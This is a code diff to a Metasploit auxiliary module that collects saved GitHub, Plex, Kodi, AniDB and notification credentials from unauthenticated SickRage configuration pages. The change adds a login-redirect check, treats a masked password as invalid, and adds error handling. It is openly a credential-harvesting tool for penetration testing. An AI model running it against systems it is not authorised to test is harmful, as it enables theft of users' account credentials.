@@ -12,7 +12,9 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'HTTP SickRage Password Leak',
       'Description'    => %q{
-        SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP responses unless the user has set login information for SickRage.
+        SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP
+        responses unless the user has set login information for SickRage.
+
         By default, SickRage does not require login information for the installation.
       },
       'Author'         =>
@@ -43,6 +45,11 @@ class MetasploitModule < Msf::Auxiliary
       'uri'    => uri
     )
 
+    # Improve this later: Add a loginscanner.
+    if res && res.headers['Location'] =~ /^\/login\//
+      raise RuntimeError, 'SickRage is protected with authentication'
+    end
+
     unless res && res.code == 200
       print_error("Unable to reach #{uri}")
       return
@@ -52,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def is_valid?(user, pass)
-    !(user.empty? || pass == 'None')
+    !(user.empty? || ['None', 'hidden_value'].include?(pass))
   end
 
   def save_creds(app, user, pass)
@@ -85,18 +92,22 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    paths = ['/config/general/', '/config/anime/', '/config/notifications/']
-    paths.each do |path|
-      config = get_config(path)
-      next if config.nil?
+    begin
+      paths = ['/config/general/', '/config/anime/', '/config/notifications/']
+      paths.each do |path|
+        config = get_config(path)
+        next if config.nil?
 
-      if path.split('/').last.eql?('notifications')
-        get_notification_creds(config)
-      end
+        if path.split('/').last.eql?('notifications')
+          get_notification_creds(config)
+        end
 
-      ['git', 'anidb', 'kodi', 'plex_server', 'plex_client'].each do |path|
-        get_creds(path, config)
+        ['git', 'anidb', 'kodi', 'plex_server', 'plex_client'].each do |path|
+          get_creds(path, config)
+        end
       end
+    rescue RuntimeError => e
+      print_error(e.message)
     end
   end
 end
